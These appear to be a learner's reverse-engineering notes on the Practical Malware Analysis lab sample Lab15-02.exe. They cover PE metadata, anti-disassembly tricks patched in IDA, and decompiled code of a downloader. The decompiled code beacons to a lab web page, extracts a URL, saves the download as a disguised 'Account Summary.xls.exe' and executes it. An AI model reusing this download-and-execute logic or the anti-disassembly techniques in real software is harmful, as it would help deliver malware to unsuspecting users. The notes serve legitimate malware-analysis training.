Lab15-02.exe
    PE Analysis
        # Virustotal
            13/69
            SHA-256: 20653de88265b4ab7b657de38e6585956368df037b66836008f8426f3e28cae6

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2011-11-16 22:11:46

            Subsystem: Windows CUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	1520	4096	2.88	f5fae7ca79af8b8deb45502c60fcd97e
                .rdata	8192	766	4096	1.18	2257e82352e2a364f2abee719b1a2f4e
                .data	12288	124	4096	0.12	2c4113b9d14eab6d4306a4e8b639fc20

            IMPORT
                MSVCRT.dll
                SHELL32.dll
                    ShellExecuteA
                WININET.dll
                    InternetReadFile
                    InternetOpenUrlA
                    InternetCloseHandle
                    InternetOpenA
                WS2_32.dll
                    WSAStartup
                    gethostname

        # strings.exe (Only part of the results)
            not enough name
            internet unable
            Bamboo::

    Dynamic Analysis
        Need 256 length hostname

        # IDA Pro & OllyDbg
            1.
            .text:0040115A                 test    esp, esp
            .text:0040115C                 jnz     short near ptr loc_40115E+1                      // always jmp
            .text:0040115E
            .text:0040115E loc_40115E:                             ; CODE XREF: .text:0040115C↑j
            .text:0040115E                 jmp     near ptr 0AA11CDh                                // D on it, C on it         [red code]

            2.
            .text:004011D2                 jz      short near ptr loc_4011D4+1                      // always jmp
            .text:004011D4
            .text:004011D4 loc_4011D4:                             ; CODE XREF: .text:004011D2↑j
            .text:004011D4                 call    near ptr 40704241h                               // D on it, C on it         [red code]

            3.
            .text:00401215 loc_401215:                             ; CODE XREF: .text:loc_401215↑j
            .text:00401215                 jmp     short near ptr loc_401215+1                      // Jump to itself? None sense, patch it to NOP! Python command: PatchByte(0x401215, 0x90) -> modify jmp to NOP

            4.
            .text:00401269                 jz      short near ptr loc_40126D+1
            .text:0040126B                 jnz     short near ptr loc_40126D+1                      // the same jmp position
            .text:0040126D
            .text:0040126D loc_40126D:                             ; CODE XREF: .text:00401269↑j
            .text:0040126D                                         ; .text:0040126B↑j
            .text:0040126D                 call    near ptr 0FF3C9FFFh                              // D on it, C on it

            5.
            .text:004012E6 loc_4012E6:                             ; CODE XREF: .text:004012EC↓j    // D on it, C on it
            .text:004012E6                 mov     ax, 5EBh
            .text:004012EA                 xor     eax, eax
            .text:004012EC                 jz      short near ptr loc_4012E6+2
            .text:004012EE                 call    near ptr 0AA1D5Dh

            .text:004012E3 ; ---------------------------------------------------------------------------
            .text:004012E6                 db 66h                                                           // PatchByte to NOP on sth like this (db) and C on it
            .text:004012E7                 db 0B8h ; ¸
            .text:004012E8 ; ---------------------------------------------------------------------------
            .text:004012E8
            .text:004012E8 loc_4012E8:                             ; CODE XREF: .text:004012EC↓j
            .text:004012E8                 jmp     short loc_4012EF
            .text:004012EA ; ---------------------------------------------------------------------------
            .text:004012EA                 xor     eax, eax
            .text:004012EC                 jz      short loc_4012E8
            .text:004012EC ; ---------------------------------------------------------------------------
            .text:004012EE                 db 0E8h
            .text:004012EF ; ---------------------------------------------------------------------------
            .text:004012EF
            .text:004012EF loc_4012EF:                             ; CODE XREF: .text:loc_4012E8↑j
            .text:004012EF                 push    0Ah

            .text:004012E6                 nop
            .text:004012E7                 nop
            .text:004012E8
            .text:004012E8 loc_4012E8:                             ; CODE XREF: .text:004012EC↓j
            .text:004012E8                 jmp     short loc_4012EF
            .text:004012EA ; ---------------------------------------------------------------------------
            .text:004012EA                 xor     eax, eax
            .text:004012EC                 jz      short loc_4012E8
            .text:004012EE                 nop

            P on code

            int __cdecl main(int argc, const char **argv, const char **envp)
            {
            Buffer = 0;
            memset(&v12, 0, 0xFFFCu);
            v13 = 0;
            v14 = 0;
            if ( WSAStartup(0x202u, &WSAData) )
                return -1;
            if ( gethostname(name, 256) )
            {
                for ( i = 0; i < 256 && name[i]; ++i )
                {
                switch ( name[i] )
                {
                    case 'Z':
                    name[i] = 'A';
                    break;
                    case 'z':
                    name[i] = 'a';
                    break;
                    case '9':
                    name[i] = '0';
                    break;
                    default:
                    ++name[i];
                    break;
                }
                }
                hInternet = InternetOpenA(name, 1u, 0, 0, 0);
                if ( !&v6 )
                JUMPOUT(*&byte_40115E);
                v4 = sub_401386();                          // v4 = 'http://www.practicalmalwareanalysis.com/bamboo.html'
                hFile = InternetOpenUrlA(hInternet, v4, 0, 0, 0, 0);
                if ( hFile && InternetReadFile(hFile, &Buffer, 0xFFFFu, &dwNumberOfBytesRead) )
                {
                InternetCloseHandle(hFile);
                Str = strstr(&Buffer, SubStr);            // Bamboo::
                if ( Str )
                {
                    *strstr(Str, asc_40303C) = 0;           // :: <- Find xxx between Bamboo::*****::
                    Filename = sub_40130F();                // Account Summary.xls.exe
                    lpBuffer = malloc(0xA00000u);
                    Str += 8;
                    hFile = InternetOpenUrlA(hInternet, Str, 0, 0, 0, 0);
                    if ( !v5 && v5 )
                    JUMPOUT(*&byte_40126D);
                    if ( InternetReadFile(hFile, lpBuffer, 0x10000u, &dwNumberOfBytesRead) && dwNumberOfBytesRead )
                    {
                    File = fopen(Filename, wb);
                    fwrite(lpBuffer, dwNumberOfBytesRead, 1u, File);
                    fclose(File);
                    ShellExecuteA(0, 0, Filename, 0, 0, 10);
                    }
                }
                result = 0;
                }
                else
                {
                printf(aInternetUnable);
                result = -1;
                }
            }
            else
            {
                printf(Format);
                result = -1;
            }
            return result;
            }

Analysis
    It will get command from a web page and the command is like this "Bamboo":{command}::" and the use ShellExecuteA() to execute it.